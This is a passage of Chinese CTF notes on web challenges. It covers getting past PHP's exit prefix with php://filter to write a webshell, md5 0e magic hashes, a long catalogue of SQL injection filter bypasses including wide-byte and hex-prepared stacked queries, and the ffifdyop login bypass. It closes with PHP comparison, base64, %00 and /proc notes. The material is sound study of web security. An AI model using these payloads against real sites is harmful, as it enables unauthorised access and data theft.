然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。
base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，
所以，当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，< ; ? >和空格等都将被去除，
于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。
这个时候后面再加上编码后的一句话木马，就可以getshell了。
```

#### strip_tags绕过

```text
这个<?php exit; ?>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。
但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。
注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
```

### web-5

```php
md5弱比较绕过，当md5进行==比较时会将0e开头的都转换为同一类型然后当作0来比较
分析php代码， if(isset($v1) && isset($v2)) 要求v1和v2都要为真 
if(!ctype_alpha($v1)){ die("v1 error");} 要求v1为字母 
if(!is_numeric($v2)){ die("v2 error"); }要求v2为数字
if(md5($v1)==md5($v2)){ echo $flag; } 只有v1和v2的MD5编码弱比较才能输出flag，弱比较（a==b:弱类型比较会将a和b转成统一数据类型在进行比较）
使用0e绕过（弱比较会把0exxxx当做科学计数法，不管后面的值为任何东西，0的任何次幂都为0） 以下是一些字符串md5值以0e开头 QNKCDZO 240610708
```

#### 0e开头的式子和原值

```text
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

#### is_numeric函数

```text
is_numeric() 函数用于检测变量是否为数字或数字字符串。
数字字符串就是"1"多打了一对引号
16进制在PHP 5下返回true, 在PHP 7下返回false
PHP 7 中参数只是是纯数字或者含有一个e 
```

#### ctype_alpha函数

```text
ctype_alpha() 函数检测字符串中所有字符是否都为字母
```

### web-6

```text
一个空格绕过,但是空格绕过要注意的事项很多
```

==空格绕过空格一定要在逗号中间加空格==

#### 一些函数绕过与总结

##### 绕过空格（/**/，%a0）

![空格绕过](posts/8087d2e8/images/BypassSpace.webp)

==URL编码对大小写不敏感所以这里的大写都可以用小写==

```text
两个空格代替一个空格，用Tab代替空格，%a0=空格：
%20 %09 %0a(换行符)%0b %0c %0d(回车符) %a0/**/  ()

最基本的绕过方法，用注释替换空格：
/*注释*/
```

```括号绕过e.g.
如果空格被过滤，括号没有被过滤，可以用括号绕过。
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

例如：
select(user())fromdualwhere(1=1)and(2=2)
这种过滤方法常常用于time based盲注,例如：
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
（from for属于逗号绕过下面会有）
上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。
```

##### 引号绕过（使用十六进制）

```text
会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：
selectcolumn_namefrominformation_schema.tableswheretable_name="users"

这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：
selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273
```

##### 逗号绕过（limit**使用from或者offset**）（substr使用from for属于逗号）：

```text
在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决：
select substr(database(0from1for1);select mid(database(0from1for1);

对于limit可以使用offset来绕过：
select*from news limit0,1# 等价select*from news limit 1offset0#
```

##### 比较符号（<>）绕过（**使用greatest()**）：

```text
同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。

最常见的一个盲注的sql语句：
select * from users where id=1 and ascii(substr(database(),0,1))>64

此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。

那么上面的这条sql语句可以使用greatest变为如下的子句:
select* from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

##### or and绕过

```text
and=&&  or=||
```

##### 绕过注释符号（#，--）过滤：

```text
id=1'union select 1,2,3||'1

最后的or '1闭合查询语句的最后的单引号，或者：
id=1'union select 1,2,'3
```

##### =绕过

```text
使用like 或者 使用< 或者 >
```

##### 绕过union,select,where

###### 使用注释符绕过

```text
常用注释符：
//，-- , /**/, #, --+, -- -, ;,%00,--a

用法：
U/**/NION/**/SE/**/LECT/**/user，pwd from user
```

###### 使用大小写绕过

```text
id=-1'UnIoN/**/SeLeCT
```

###### 内联注入绕过

```text
id=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#
```

###### 双关键字绕过

```text
d=-1'UNIunionONSeLselectECT1,2,3–-
```

###### 通用绕过(编码绕过、双重编码绕过)

```text
如URLEncode编码，ASCII,HEX,unicode编码绕过：
or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。
```

###### 等价函数绕过

```text
hex()、bin()==>ascii()
sleep()==>benchmark()
concat_ws()==>group_concat()
mid()、substr()==>substring() @@user==>user() @@datadir==>datadir()

举例：substring()和substr()无法使用时：
?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：

substr((select'password'),1,1)=0x70strcmp(left('password',1),0x69)=1strcmp(left('password',1),0x70)=0strcmp(left('password',1),0x71)=-1
```

##### 宽字节注入

```text
过滤 ' 的时候往往利用的思路是将 ' 转换为 \' 。
在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：
（1）%df 吃掉 \ 具体的方法是 urlencode('\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：
id=-1%df%27union select 1,user(),3--+

（2）将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。
一般产生宽字节注入的PHP函数：
1.replace（）：过滤 ' \ ，将 ' 转化为 \' ，将 \  转为 \\，将 " 转为 \" 。用思路一。

2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：' , " , \ 。用思路一
（防御此漏洞，要将 mysql_query 设置为 binary 的方式）

3.mysql_real_escape_string()：转义下列字符：
\x00    \n    \r    \'"    \x1a
（防御，将mysql设置为gbk即可）
```

### web-7

==有时候单引号也会过滤所以最后数据库可以尝试双引号，如果前面正常注入成功==

### web-8

```text
过滤了逗号，单引号，空格
```

==大部分过滤了逗号的都可以使用盲注绕过==

```payload
过滤了逗号使用from for
vince'/**/or/**/ascii(substr(database()from/**/1/**/for/**/1))=119#
然后使用burp爆破表名和字段名

id=1/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/1/**/for/**/1))=102#
```

###### 十六进制编码绕过

```text
1';show databases;#
如果这样有回显才可以使用下面这个十六进制绕过

1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
```

### web-9

```text
尝试用sql注入的万能密码绕过,都无果
最后用dirsearch扫描网站发现.robots.txt目录，里面有index.phps
分析代码，md5，sql注入绕过

SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'
true默认不写则为false，则转换为32位16进制的字符串。
true为16位原始二进制的字符串

32位16进制字符串的意思是：将MD5加密得到的128 位长度的"指纹信息"，以每4位为一组，分为32组，每组以转换为16进制，进行转换得到一个32位的字符串。
16位原始二进制格式的字符串的意思是：将128 位长度的"指纹信息"分组转化为16位的一个字符串，然后两个字符为一组，依照ACILL码转化为字符串。

如果为true，我们有一个万能密码，ffifdyop，转换为字符串为'or'6(后面乱码)

在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，
那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，
所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的
所以上面万能密码就变成了'or'truexxx
```





# CTF记录

### 引号解析

```text
php中：
"解析变量"，'不解析变量'
```

### 浏览器传参对文本进行操作多采用的是URL编码

**换行**

```text
%0A
```

### php中的强比较和弱比较

!==是强比较运算符，只要满足类型或者值有一个不相等就会返回true，只有在类型和值都满足的情况下返回false

===是强比较运算符，必须类型和值都相等才会返回true，其他都返回false

==是弱比较运算符，类型不同会按照类型优先级进行转换，然后再比较

### 类型转换的优先级

```text
优先级总结：
浮点数和整数：浮点数和整数进行比较时，整数会被转换为浮点数，然后进行比较。

布尔值：布尔值会转换为整数（false 转为 0，true 转为 1）。

字符串：如果其中一个值是字符串，PHP 会尝试将字符串转换为数字进行比较。如果字符串的内容能够成功转换为数字，PHP 会将其转换为数字，然后进行比较。
如果字符串无法被转换为有效的数字（如 "abc"），则会被转换为 0（数字类型）。

数组：空数组视为 false，非空数组视为 true。数组与数字、字符串等其他类型的比较总是返回 false，因为数组的类型转换为其他类型时结果并不相等。

对象：对象首先会尝试转换为字符串，如果没有 __toString() 方法，则转换为布尔值。
```

==编码影响==

```text
例如base64编码的+和=可能被浏览器解析成为其他字符，而不是源码字符，所以这时对一些被浏览器过滤的字符进行URL编码
```

```e.g.
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
这个例子中多了一个引号就发生了浏览器解析错误,这个加号被解析成空格可能
```

### php中的自动结尾

```text
<?php?>如果文件结尾以?>封闭了那么代码最后一句可以不加;?>会帮你自动补全
```

### Base64的编码规则

```text
Base64是一种基于64个可见字符来表示二进制数据的方法，它的编码范围和解码范围主要涉及以下几个方面：

一、编码范围
字符集：Base64的字符集包括小写字母a~z、大写字母A~Z、数字0~9、符号“+”、“/”，以及用于填充的“=”（等号）。这些字符共64个，可以表示6位的二进制数据（因为2^6=64）。
输入数据：Base64编码的输入数据可以是任意的二进制数据，例如文本、图片、音频等文件的二进制表示。
编码规则：
将输入的二进制数据每3个字节（24位）分为一组。
将这24位数据划分为4个6位的数据段。
将每个6位的数据段转换为对应的Base64字符。
如果输入的二进制数据长度不是3的倍数，则会在最后填充0（用“=”表示），以确保输出的Base64字符串长度是4的倍数。

二、解码范围
字符集：Base64解码的字符集与编码时相同，即包括小写字母a~z、大写字母A~Z、数字0~9、符号“+”、“/”，以及用于填充的“=”。
输出数据：Base64解码的输出数据是原始的二进制数据，与编码前的数据完全相同（不考虑编码过程中可能引入的填充字符“=”）。
解码规则：
将输入的Base64字符串每4个字符分为一组。
将每个Base64字符转换为对应的6位二进制数据。
将这4个6位的数据段合并为一个24位的二进制数据。
如果输入的Base64字符串中包含填充字符“=”，则根据“=”的数量去掉对应的填充0。
将处理后的二进制数据转换为原始的二进制表示。

```

### %00截断

在 PHP 中，许多基于 C 语言的字符串处理函数（如 `strlen()`、`substr()`、`str_replace()`、`strpos()` 等）都可能在遇到 `NULL` 字符时停止处理，从而截断字符串。由于 `NULL` 字符表示字符串的结束符，PHP 中的这些函数会将其视为字符串的终止符，因此会截断在其之后的内容。

下面是被%00截断影响的一些函数----**(后面会陆续补充)**

**`strlen()`**

- **行为：** `strlen()` 函数返回字符串的长度。它会在遇到第一个 `NULL` 字符时停止计数。 

**`substr()`**

- **行为：** `substr()` 函数返回字符串的子串。当字符串中包含 `NULL` 字符时，`substr()` 会把它当作字符串的结束符，从而截断字符串。

**`str_replace()`**

- **行为：** `str_replace()` 会在遇到 `NULL` 字符时将其视为字符串的结束符，但它通常会对字符串中的其他部分进行替换。如果替换的目标字符串中包含 `NULL` 字符，它也可能会受到影响。

**`explode()`**

- **行为：** `explode()` 函数会将字符串按指定分隔符拆分成数组。它会受到 `NULL` 字符的影响，遇到 `NULL` 字符时可能会导致字符串的截断。

**`strpos()` / `strrpos()`**

- **行为：** 这两个函数分别用于查找字符串中第一次和最后一次出现子串的位置。它们在遇到 `NULL` 字符时也会停止查找。

**`printf()` / `sprintf()`**

- **行为：** 这两个函数也会在遇到 `NULL` 字符时停止输出，因为它们基于 C 语言的字符串处理规则。

**`file_get_contents()`**

- **行为：** `file_get_contents()` 函数会读取文件内容为字符串。如果文件内容中包含 `NULL` 字符，`file_get_contents()` 会把它当作字符串的结束符，导致文件内容被截断。

**`fgets()`**

- **行为：** `fgets()` 用于从文件中读取一行内容。如果读取的内容中包含 `NULL` 字符，`fgets()` 会将其视为字符串的终止符，从而截断读取的内容。

**`implode()`**

- **行为：** `implode()` 将数组的元素连接成一个字符串。尽管 `implode()` 本身不会在遇到 `NULL` 字符时截断字符串，但数组元素中的 `NULL` 字符会影响它的行为，可能导致某些元素被忽略或错误处理

**`ereg()`**

+ **行为：**`ereg`和`preg_match()`功能一样，但是他的正则匹配会被%00截断，遇到%00后面就不再进行匹配

### **/proc 目录简介**

- **虚拟文件系统**：`/proc` 目录中的文件并不占用硬盘空间，它们是由内核在访问时动态生成的。通过读取这些文件，用户可以获取系统运行时的各种信息。
- **进程信息**：`/proc` 目录中包含了每个正在运行的进程的子目录。每个进程都有一个与其进程 ID（PID）相对应的目录，例如，进程号为 1234 的进程会在 `/proc/1234` 目录中存储其相关信息。目录中包含该进程的状态、内存映像、打开的文件等信息。
- **系统信息**：除了进程信息外，`/proc` 还包含系统级的信息。例如：
	- `/proc/cpuinfo`：CPU 的信息。
	- `/proc/meminfo`：内存的使用情况。
	- `/proc/uptime`：系统启动时间和运行时间。
	- `/proc/net`：网络相关信息。
	- `/proc/sys`：内核的运行时参数（例如，网络、进程调度等）。

#### `/proc` 目录下常见文件和子目录

- **进程目录**：每个进程都有一个与其 PID 对应的子目录，例如 `/proc/1234` 表示进程号为 1234 的进程。这个目录下包含了该进程的多种信息，如：
	- `/proc/[PID]/status`：该进程的状态信息，包括内存、线程、PID、父进程 ID 等。
	- `/proc/[PID]/cwd`：该进程的当前工作目录（这是一个符号链接，指向进程的当前工作目录）。
	- `/proc/[PID]/exe`：该进程的可执行文件路径。
	- `/proc/[PID]/fd/`：该进程打开的文件描述符的目录。
- **系统信息**：
	- `/proc/cpuinfo`：显示 CPU 的详细信息（如型号、核心数、频率等）。
	- `/proc/meminfo`：显示当前内存的使用情况。
	- `/proc/uptime`：显示系统的运行时间和空闲时间。
	- `/proc/loadavg`：系统负载的统计信息。
- **内核配置**：
	- `/proc/sys/`：这个目录允许用户查看和修改内核的配置参数。比如 `/proc/sys/net/ipv4/ip_forward` 控制是否开启 IP 转发。

#### `/proc/self` 目录

`/proc/self` 是 `/proc` 中一个非常特别的目录，它始终指向当前访问的进程自身。简单来说，无论你在哪个进程中读取 `/proc/self`，它都会指向当前进程的相关信息。





